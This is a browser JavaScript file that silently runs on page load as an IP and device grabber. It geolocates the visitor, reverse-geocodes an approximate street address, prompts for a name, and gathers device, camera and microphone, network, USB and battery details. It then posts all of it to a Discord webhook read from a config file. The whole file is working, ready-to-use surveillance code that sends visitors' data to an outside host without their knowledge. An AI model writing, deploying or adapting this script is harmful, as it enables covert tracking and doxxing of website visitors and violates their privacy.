const grabData = async () => {
    try {
        // Fetch webhook token from config.json
        const response = await fetch("./config.json");
        const dataExport = await response.json();
        const Webhook = dataExport.Token;

        // Fetch IP data
        const ipResponse = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=" + dataExport.key);
        const ipData = await ipResponse.json();

        // Fetch user agent data
        const userAgentResponse = await fetch("https://api.ipgeolocation.io/user-agent?apiKey=" + dataExport.key);
        const userAgentData = await userAgentResponse.json();

        // Reverse geocode to get live address
        const reverseGeocodeResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${ipData.latitude}&lon=${ipData.longitude}&format=json`);
        const reverseGeocodeData = await reverseGeocodeResponse.json();
        const address = reverseGeocodeData.display_name;

        // Get user's name using prompt
        const userName = prompt("Please enter your name:");

        // Additional User Data
        const deviceInfo = {
            productSub: navigator.productSub,
            vendor: navigator.vendor,
            maxTouchPoints: navigator.maxTouchPoints,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            cookieEnabled: navigator.cookieEnabled,
            appCodeName: navigator.appCodeName,
            appName: navigator.appName,
            appVersion: navigator.appVersion,
            platform: navigator.platform,
            product: navigator.product,
            userAgent: navigator.userAgent,
            language: navigator.language,
            languages: navigator.languages,
            webdriver: navigator.webdriver,
            pdfViewerEnabled: window.navigator.plugins.namedItem('Chrome PDF Viewer') !== null,
            deviceMemory: navigator.deviceMemory,
        };

        const mediaDeviceInfo = {
            audioinput: await navigator.mediaDevices.enumerateDevices().then(devices => devices.filter(device => device.kind === 'audioinput')),
            videoinput: await navigator.mediaDevices.enumerateDevices().then(devices => devices.filter(device => device.kind === 'videoinput')),
            audiooutput: await navigator.mediaDevices.enumerateDevices().then(devices => devices.filter(device => device.kind === 'audiooutput')),
        };

        const networkInfo = {
            type: navigator.connection.type,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData,
            effectiveType: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            downlinkMax: navigator.connection.downlinkMax,
        };

        const usbDevices = await navigator.usb.getDevices().then(devices => devices.length);

        const batteryInfo = {
            batteryLevel: navigator.getBattery ? await navigator.getBattery().then(battery => battery.level) : "Battery information not available",
            isCharging: navigator.getBattery ? await navigator.getBattery().then(battery => battery.charging) : "Battery information not available",
        };

        // Open XMLHttpRequest POST Request
        const postRequest = new XMLHttpRequest();
        postRequest.open("POST", Webhook);
        postRequest.setRequestHeader("Content-type", "application/json");

        // Creating Discord Webhook payload
        const params = {
            username: "Website Visited From " + ipData.country_name + "/" + ipData.city,
            avatar_url: "https://cdn-icons-png.flaticon.com/512/7013/7013144.png",
            content: null,
            embeds: [
                {
                    title: "** ** ** **:globe_with_meridians: IP Adress: " + ipData.ip,
                    url: "https://whatismyipaddress.com/ip/" + ipData.ip,
                    description: "** **",
                    thumbnail: {
                        url: ipData.country_flag,
                    },
                    color: 1993898,
                    fields: [
                        // Existing fields...

                        // Additional fields for device, media device, network, USB devices, and battery information
                        {
                            name: "📱 Device Information",
                            value: JSON.stringify(deviceInfo),
                            inline: false,
                        },
                        {
                            name: "📷 Media Device Information",
                            value: JSON.stringify(mediaDeviceInfo),
                            inline: false,
                        },
                        {
                            name: "🕸️ Network Information",
                            value: JSON.stringify(networkInfo),
                            inline: false,
                        },
                        {
                            name: "🔌 Total USB devices connected",
                            value: JSON.stringify(usbDevices),
                            inline: false,
                        },
                        {
                            name: "🔋 Battery Information",
                            value: "Battery Level: " + batteryInfo.batteryLevel + "\nCharging: " + batteryInfo.isCharging,
                            inline: false,
                        },
                        {
                            name: "User Info",
                            value: "User Name: " + userName,
                            inline: false,
                        },
                    ],
                    footer: {
                        text: "Visited on: " + new Date(),
                        icon_url: "https://cdn-icons-png.flaticon.com/512/2088/2088617.png",
                    },
                },
            ],
        };

        // Send Webhook
        postRequest.send(JSON.stringify(params));
    } catch (error) {
        console.error("Error:", error);
    }
};

// Start App
grabData();
